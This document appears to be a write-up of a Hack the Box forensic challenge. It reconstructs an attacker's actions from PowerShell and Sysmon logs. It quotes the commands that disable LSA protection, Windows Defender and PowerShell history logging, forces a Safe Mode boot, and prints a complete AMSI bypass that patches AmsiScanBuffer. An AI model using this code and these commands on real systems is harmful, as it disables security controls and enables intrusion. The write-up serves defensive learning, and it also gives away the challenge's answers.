# Operation Blackout 2025: Smoke in Mirrors

Hack the Box Room Link: [SmokeinMirrors](https://app.hackthebox.com/sherlocks/Operation%2520Blackout%25202025%253A%2520Smoke%2520%2526%2520Mirrors)

1. The attacker disabled LSA protection on the compromised host by modifying a registry key. What is the full path of that registry key?
*Answer*: HKLM\SYSTEM\CurrentControlSet\Control\LSA
* Pull the PowerShell operation logs and focus on event ID 4104. Looking through the payload details for each of the logs you can find the one with ```"reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL /t REG_DWORD /d 0 /f``` which changes the reg key using ```reg add```. 

2. Which PowerShell command did the attacker first execute to disable Windows Defender?
*Answer*: Set-MpPreference -DisableIOAVProtection $true -DisableEmailScanning $true -DisableBlockAtFirstSeen $true
* Look through the Windows PowerShell logs for Event ID 800 to focus on pipeline execution details. From there, Defender can have its preferences changed in PowerShell using ```Set-MpPreference``` as seen [here](https://learn.microsoft.com/en-us/powershell/module/defender/set-mppreference?view=windowsserver2025-ps). Filter the logs for payloads with ```Set-MpPreference``` and find it at 2025-04-10 06:31:35. 

3. The attacker loaded an AMSI patch written in PowerShell. Which function in the DLL is being patched by the script to effectively disable AMSI?
*Answer*: AMSIScanBuffer
* In the Powershell operational logs, there is a function called ```Disable-Protection``` which details the actions that are going to be taken to impact AMSI. The script is obfuscated slightly to make it harder to read, but overall the answer can be found in ```function Disable-Protection {,     $k = @", using System;, using System.Runtime.InteropServices;, public class P {,     [DllImport("kernel32.dll")],     public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);,     [DllImport("kernel32.dll")],     public static extern IntPtr GetModuleHandle(string lpModuleName);,     [DllImport("kernel32.dll")],     public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);,     public static bool Patch() {,         IntPtr h = GetModuleHandle("a" + "m" + "s" + "i" + ".dll");,         if (h == IntPtr.Zero) return false;,         IntPtr a = GetProcAddress(h, "A" + "m" + "s" + "i" + "S" + "c" + "a" + "n" + "B" + "u" + "f" + "f" + "e" + "r");,         if (a == IntPtr.Zero) return false;,         UInt32 oldProtect;,         if (!VirtualProtect(a, (UIntPtr)5, 0x40, out oldProtect)) return false;,         byte[] patch = { 0x31, 0xC0, 0xC3 };,         Marshal.Copy(patch, 0, a, patch.Length);,         return VirtualProtect(a, (UIntPtr)5, oldProtect, out oldProtect);,     }, }, "@,     Add-Type -TypeDefinition $k,     $result = [P]::Patch(),     if ($result) {,         Write-Output "Protection Disabled",     } else {,         Write-Output "Failed to Disable Protection",     }, }```. All activity within event ID 4104 at 2025-04-10 06:37:47. 

4. Which command did the attacker use to restart the machine in Safe Mode?
*Answer*: bcdedit.exe /set safeboot network
* Within the Sysmon logs, look for event ID 1 and logs which contain powershell as the parent process. The activity can be found at 2025-04-10 06:38:35. 

5. Which PowerShell command did the attacker use to disable PowerShell command history logging? 
*Answer*: Set-PSReadlineOption -HistorySaveStyle SaveNothing
* If you google how this is done commonly, can search for the ```Set-PSReadlineOption``` within the payload data of the Operational Powershell logs. Action occurred at 2025-04-10 06:38:43. 